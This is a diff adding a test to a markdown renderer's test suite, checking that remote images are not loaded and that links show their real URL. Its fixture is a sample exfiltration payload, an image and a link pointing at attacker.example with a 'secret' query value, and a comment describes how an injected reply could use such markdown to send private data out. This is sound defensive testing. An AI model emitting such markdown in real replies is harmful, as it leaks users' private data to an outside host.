@@ -24,6 +24,17 @@ describe("markdown", () => {
     expect(html).toContain('href="https://example.com"');
     expect(html).not.toContain("javascript:");
   });
+
+  it("never loads a remote image, showing its alt text, and names a link's real url", () => {
+    // What an injected reply would use to send private data out: an image's url, or a link
+    // whose text hides where it goes.
+    const html = renderToStaticMarkup(
+      <Markdown text={"![your inbox](https://attacker.example/p.png?d=secret) and [the docs](https://attacker.example/x?d=secret)"} onOpen={noop} />,
+    );
+    expect(html).not.toContain("<img");
+    expect(html).toContain('<span class="image-alt">your inbox</span>');
+    expect(html).toContain('title="https://attacker.example/x?d=secret"');
+  });
 });
 
 describe("a question", () => {
